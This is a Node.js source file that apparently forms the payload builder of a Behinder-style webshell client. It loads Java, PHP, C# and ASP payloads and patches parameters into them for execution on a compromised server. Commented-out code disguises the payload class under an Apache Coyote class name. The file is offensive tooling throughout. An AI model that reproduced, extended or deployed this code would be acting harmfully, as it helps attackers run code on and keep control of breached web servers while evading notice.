const fs = require("fs");
const fix = require("./class_fix");
const utils = require("./utils");

function getParamedClass(className, params) {
    let payload = fs.readFileSync(__dirname + "/../payload/java/" + className + ".class");
    payload = Buffer.from(payload, 'utf-8').toString('base64');
    for (let [k, v] of params) {
        payload = fix(payload, k, v)
    }
    // console.log("payload :" + payload);
    // var oldClassName = `net/behinder/payload/java/${className}`
    // var result;
    // if (className != "LoadNativeLibraryGo") {
    //   newClassName = "org/apache/coyote/MappingJsonFactory"
    //   fmt.Println("随机包名Class :", newClassName);
    //   result = utils.ReplaceClassName(result, oldClassName, newClassName)
    // }
    // 没有直接编译，而是直接修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行，不知道有没有 bug
    // result[7] = 49
    return payload
}


function getParamedPhp(fileName, params) {
    let code = ""
    let payload = fs.readFileSync(__dirname + "/../payload/php/" + fileName + ".php");
    let paraList = "";
    let paramsList = getPhpParams(payload)
    for (let paraName of paramsList) {
        if (utils.InStrSlice(paraName, Array.from(params.keys()))) {
            let paraValue = params.get(paraName);
            paraValue = Buffer.from(paraValue).toString('base64');
            code += `\$${paraName}=\"${paraValue}\";\$${paraName}=base64_decode(\$${paraName});`
            paraList = paraList + ",$" + paraName
        } else {
            code += `\$${paraName}="";`
            paraList = paraList + ",$" + paraName
        }
    }
    paraList = paraList.replace(",", "")
    code = payload.toString() + code + `\r\nmain(${paraList});`
    return code
}

function getPhpParams(payload) {
    let paramList = []
    let mainRegex = /main\s*\([^)]*\)/gm
    let mainMatch = payload.toString().match(mainRegex)
    if (mainMatch.length === 1 && mainMatch[0].length > 0) {
        let mainStr = mainMatch[0]
        let regex = /\$([a-zA-Z]*)/g
        let paramRegex = mainStr.match(regex)
        if (paramRegex.length > 0) {
            for (let value of paramRegex) {
                paramList.push(value.replace('$', ""))
            }
        }
    }
    return paramList
}


function getParamedAssembly(fileName, params) {
    let payload = fs.readFileSync(__dirname + "/../payload/csharp/" + fileName + ".dll");
    let bufcode = Buffer.from(payload)
    if (Array.from(params.keys()).length === 0) {
        return payload
    } else {
        let paramsStr = ""
        let paramName, paramValue
        for (let key of params.keys()) {
            paramName = key
            paramValue = Buffer.from(params.get(paramName)).toString('base64');
            paramsStr = paramsStr + paramName + ":" + paramValue + ","
        }
        paramsStr = paramsStr.substring(0, paramsStr.length - 1);
        let token = "~~~~~~" + paramsStr
        console.log(token)
        let bufToken = Buffer.from(token)
        return Buffer.concat([bufcode, bufToken]);
    }
}

function getParamedAsp(fileName, params) {
    let code = ""
    let payload = fs.readFileSync(__dirname + "/../payload/asp/" + fileName + ".asp");
    let paraList = "";
    console.log(params)
    if (Array.from(params.keys()).length > 0) {
        paraList += "Array(";
        for (let value of params.values()) {
            let paraValueEncoded = "";
            for (let i = 0; i < value.length; i++) {
                paraValueEncoded = paraValueEncoded + "chr(" + value.charAt(i).charCodeAt() + ")&"
            }
            paraValueEncoded = paraValueEncoded.substr(0, paraValueEncoded.length - 1)
            paraList = paraList + "," + paraValueEncoded
        }
        paraList = paraList + ")"
    }
    paraList = paraList.replace(",", "")
    code = payload.toString() + code + `\r\nmain ${paraList}`
    return code
}

module.exports = {getParamedClass, getParamedPhp, getParamedAssembly, getParamedAsp}
